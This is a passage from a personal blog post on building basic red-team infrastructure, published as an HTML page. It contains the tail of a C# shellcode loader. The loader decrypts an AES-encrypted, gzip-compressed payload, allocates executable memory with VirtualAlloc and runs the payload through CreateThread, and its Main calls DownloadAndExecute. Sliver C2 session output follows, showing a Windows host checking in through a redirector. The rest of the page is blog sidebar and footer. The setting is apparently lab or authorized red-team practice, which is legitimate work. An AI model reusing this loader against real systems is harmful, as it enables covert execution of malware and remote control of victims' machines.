&#125;;   </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">16</span>; i &lt;= shellcode.Length <span class="number">-1</span>; i++) &#123;</span><br><span class="line">                l.Add(shellcode[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] actual = l.ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] decrypted;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(shellcode.Length);</span><br><span class="line">            Console.WriteLine(l.Count);</span><br><span class="line">            Console.WriteLine(actual.Length);</span><br><span class="line"></span><br><span class="line">            decrypted = Decrypt(actual, AESKey, AESIV);</span><br><span class="line">            IntPtr addr = VirtualAlloc(IntPtr.Zero, (<span class="built_in">uint</span>)decrypted.Length, <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">            Marshal.Copy(decrypted, <span class="number">0</span>, addr, decrypted.Length);</span><br><span class="line">            IntPtr hThread = CreateThread(IntPtr.Zero, <span class="number">0</span>, addr, IntPtr.Zero, <span class="number">0</span>, IntPtr.Zero);</span><br><span class="line">            WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Decompress</span>(<span class="params"><span class="built_in">byte</span>[] bytes</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">using</span> (<span class="keyword">var</span> memoryStream = <span class="keyword">new</span> MemoryStream(bytes))</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (<span class="keyword">var</span> outputStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (<span class="keyword">var</span> decompressStream = <span class="keyword">new</span> GZipStream(memoryStream, CompressionMode.Decompress))</span><br><span class="line">                    &#123;</span><br><span class="line">                        decompressStream.CopyTo(outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> outputStream.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] ciphertext, <span class="built_in">string</span> AESKey, <span class="built_in">string</span> AESIV</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] key = Encoding.UTF8.GetBytes(AESKey);</span><br><span class="line">            <span class="built_in">byte</span>[] IV = Encoding.UTF8.GetBytes(AESIV);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (Aes aesAlg = Aes.Create())</span><br><span class="line">            &#123;</span><br><span class="line">                aesAlg.Key = key;</span><br><span class="line">                aesAlg.IV = IV;</span><br><span class="line">                aesAlg.Padding = PaddingMode.None;</span><br><span class="line"></span><br><span class="line">                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(ciphertext))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cryptoStream.Write(ciphertext, <span class="number">0</span>, ciphertext.Length);</span><br><span class="line">                        <span class="keyword">return</span> Decompress(memoryStream.ToArray());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params">String[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            DownloadAndExecute();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Session should be established pointing to the redirector.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sliver (CLEAR_METHOD) &gt; sessions </span><br><span class="line"></span><br><span class="line"> ID         Name           Transport   Remote Address                              Hostname   Username                     Operating System   Locale   Last Message                               Health </span><br><span class="line">========== ============== =========== =========================================== ========== ============================ ================== ======== ========================================== ========</span><br><span class="line"> 14e3b4ba   CLEAR_METHOD   http(s)     tcp(192.168.24.138:36434)-&gt;192.168.24.135   commando   COMMANDO\Mostafa.Noureldin   windows/amd64      en-US    Sat Jan 28 19:50:03 EST 2023 (7m53s ago)   [DEAD] </span><br><span class="line"></span><br><span class="line">sliver (CLEAR_METHOD) &gt; info</span><br><span class="line"></span><br><span class="line">        Session ID: 3d730b7b-3ab1-41ba-845b-620c4d52588c</span><br><span class="line">              Name: COLOURED_EXIT</span><br><span class="line">          Hostname: commando</span><br><span class="line">              UUID: 96724d56-78cb-ee26-2d12-efbe4931b42d</span><br><span class="line">          Username: COMMANDO\Mostafa.Noureldin</span><br><span class="line">               UID: S-1-5-21-3124759866-2301652251-578080113-1000</span><br><span class="line">               GID: S-1-5-21-3124759866-2301652251-578080113-513</span><br><span class="line">               PID: 6352</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: 10 build 19044 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:36154)-&gt;192.168.24.135</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Mon Jan 30 17:27:53 EST 2023 (26s ago)</span><br><span class="line">      Last Checkin: Mon Jan 30 17:28:14 EST 2023 (5s ago)</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+	
+	</div>
+  <a type="button" href="/2023/02/01/Basic-Red-Team-Infrastructure/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/red-team/infrastructure/">infrastructure<span>1</span></a></li>
+		
+			<li><a href="/categories/red-team/">red team<span>1</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+	<div class="widget">
+		<h4>Tag Cloud</h4>
+		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/tags/apache/">apache<span>1</span></a></li>
+		
+			<li><a href="/tags/c2/">c2<span>1</span></a></li>
+		
+			<li><a href="/tags/team-server/">team server<span>1</span></a></li>
+		
+			<li><a href="/tags/redirector/">redirector<span>1</span></a></li>
+		
+			<li><a href="/tags/Sliver/">Sliver<span>1</span></a></li>
+		
+			<li><a href="/tags/ssh-tunnel/">ssh tunnel<span>1</span></a></li>
+		
+		 
+		</ul>
+	</div>
+
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/02/01/Basic-Red-Team-Infrastructure/" ><i class="fa fa-file-o"></i>Basic Red Team Infrastructure</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/mmnoureldin" title="" target="_blank"]);">mnoureldin github.</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Mostafa Noureldin's Blog
+  
+       
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+</body>
+   </html>
